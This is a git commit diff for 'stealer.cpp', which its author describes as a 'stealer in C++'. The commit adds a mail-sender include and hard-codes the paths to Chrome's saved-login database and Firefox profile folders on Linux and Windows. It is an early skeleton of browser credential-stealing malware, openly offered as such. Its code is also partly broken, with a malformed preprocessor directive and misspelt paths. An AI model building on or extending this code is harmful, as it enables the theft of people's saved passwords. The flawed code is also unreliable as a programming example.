0f4ca806aa9ff05f5d33331d650ed4b0788fa916
HlebHatouka <hlem.hatouka@protonmail.com>
2019-10-09 13:59:55 +0300

    update stealer.cpp

--- stealer.cpp
+++ stealer.cpp
@@ -3,9 +3,29 @@
 // Author      : Hleb Hatouka
 // Description : stealer in C++
 //============================================================================
+#include "mailsender.h"
+#include <exception>
+#include <filesystem>
+
+namespace fs = std::filesystem;
 
 int main()
 {
+    try
+    {
+#ifdef __linux__
 
-	return 0;
+        std::string chome_db_path = "~/.config/google-chrome/Default";
+        std::string firefox_db_path = "~/.mozzila/firefox/<profilename>";
+
+#else _WIN32
+
+        std::string chome_db_path = "\\Google\\Chrome\\User Data\\Default\\Login Data";
+        std::string firefox_db_path = "\\Mozzila\\Firefox\\Profiles\\";
+
+#endif
+    }
+    catch(std::exception &){}
+
+    return 0;
 }
